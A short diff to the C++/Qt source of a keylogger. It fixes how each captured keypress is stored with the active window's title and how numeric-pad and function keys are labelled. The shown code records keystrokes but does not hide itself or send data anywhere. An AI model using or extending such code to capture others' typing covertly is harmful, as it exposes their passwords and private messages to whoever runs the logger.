@@ -30,7 +30,7 @@ void KeyLogger::startLog() {
 
         KeyPress* keyPress = new KeyPress;
         keyPress->application(QString(title));
-        QStringList keys = keyPress->keys();
+        QStringList keys;
         keys.push_back(key);
         keyPress->keys(keys);
         emit keyPressed(keyPress);
@@ -43,9 +43,9 @@ QString codeToKey(unsigned char code) {
   if((code >= 65 && code <= 90) || (code >= 48 && code <= 57) || (code == 32))
     return QString(QChar(code));
   else if(code >= 96 && code <= 105)
-    return QString("[NUM ").append(code - 96).append("]");
+    return QString("[NUM ").append(QString::number(code - 96)).append("]");
   else if(code >= 112 && code <= 123)
-    return QString("[F").append(code - 111).append("]");
+    return QString("[F").append(QString::number(code - 111)).append("]");
 
   switch(code) {
   case 1:
